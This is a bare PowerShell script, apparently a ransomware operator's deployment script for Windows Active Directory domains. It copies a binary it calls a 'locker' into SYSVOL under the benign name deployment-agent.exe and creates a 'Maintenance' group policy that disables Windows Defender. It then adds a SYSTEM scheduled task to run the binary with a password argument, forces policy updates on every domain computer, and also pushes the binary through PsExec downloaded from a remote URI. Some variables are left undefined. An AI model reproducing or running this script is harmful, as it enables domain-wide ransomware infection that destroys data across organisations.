try { Import-Module ServerManager -ErrorAction Stop } catch {}
try { Add-WindowsFeature RSAT-AD-PowerShell -ErrorAction SilentlyContinue } catch {}
try { Install-WindowsFeature RSAT-AD-PowerShell -ErrorAction SilentlyContinue } catch {}
Import-Module ActiveDirectory -ErrorAction SilentlyContinue
Import-Module GroupPolicy -ErrorAction SilentlyContinue

Write-Host "[+] Getting domain info..."
try {
    $Domain = (Get-ADDomain).DNSRoot
    $DomainDN = (Get-ADDomain).DistinguishedName
    Write-Host "[+] Domain from AD: $Domain"
} catch {
    try {
        $Domain = (Get-WmiObject Win32_ComputerSystem).Domain
        $DomainDN = "DC=" + ($Domain -replace '\.',',DC=')
        Write-Host "[+] Domain from WMI: $Domain"
    } catch {
        $Domain = $env:USERDNSDOMAIN
        $DomainDN = "DC=" + ($Domain -replace '\.',',DC=')
        Write-Host "[+] Domain from env: $Domain"
    }
}

Write-Host "[+] Copying locker to SYSVOL scripts..."
$SysvolScripts = "\\$Domain\SYSVOL\$Domain\scripts"
Copy-Item -Path "C:\Windows\Temp\deployment-agent.exe" -Destination "$SysvolScripts\deployment-agent.exe" -Force
$GpoName = "Maintenance"
New-GPO -Name $GpoName -ErrorAction SilentlyContinue | Out-Null
$GpoScheduledPath = "\\$Domain\SYSVOL\$Domain\Policies\{$guid}\Machine\Preferences\ScheduledTasks"

Remove-GPPrefRegistryValue -Name $GpoName -Context Computer -Key "HKLM\Software\GPOVersionUpdate" -ValueName "Trigger" -ErrorAction SilentlyContinue | Out-Null
Set-GPRegistryValue -Name $GpoName -Key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -Type DWord -Value 1 -ErrorAction SilentlyContinue | Out-Null
New-GPLink -Name $GpoName -Target "OU=Domain Controllers,$DomainDN" -ErrorAction SilentlyContinue | Out-Null

$TaskXml = @'
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="TASKNAME_PLACEHOLDER" image="0" changed="TASKDATE_PLACEHOLDER" uid="TASKGUID_PLACEHOLDER" userContext="0" removePolicy="0">
    <Properties action="U" name="TASKNAME_PLACEHOLDER" runAs="NT AUTHORITY\System" logonType="S4U">
      <Task version="1.2">
        <Principals>
          <Principal id="Author">
            <UserId>NT AUTHORITY\System</UserId>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
        </Principals>
        <Actions Context="Author">
          <Exec>
            <Command>\\$Domain\SYSVOL\$Domain\scripts\deployment-agent.exe</Command>
            <Arguments>--password OtherSecret --system --fast</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </TaskV2>
</ScheduledTasks>
'@
New-Item -ItemType Directory -Path $GpoScheduledPath -Force | Out-Null
Set-Content -Path "$GpoScheduledPath\ScheduledTasks.xml" -Value $TaskXml -Encoding UTF8 -Force

$computers = try { Import-Module ActiveDirectory -ErrorAction Stop; Get-ADComputer -Filter * | Select-Object -ExpandProperty Name } catch {}
foreach ($comp in $computers) {
    Invoke-GPUpdate -Computer $comp -RandomDelayInMinutes 0 -Force -ErrorAction SilentlyContinue
    Invoke-Command -ComputerName $comp -ScriptBlock { gpupdate /force } -ErrorAction SilentlyContinue
}

Invoke-WebRequest -Uri $PsExecUri -OutFile 'C:\Temp\psexec.exe'
foreach ($comp in $computers) {
    Copy-Item -Path "C:\Windows\Temp\deployment-agent.exe" -Destination "\\$comp\C$\Windows\Temp\deployment-agent.exe" -Force -ErrorAction SilentlyContinue
    & 'C:\Temp\psexec.exe' -accepteula -d -s "\\$comp" "C:\Windows\Temp\deployment-agent.exe" --password OtherSecret --system
}
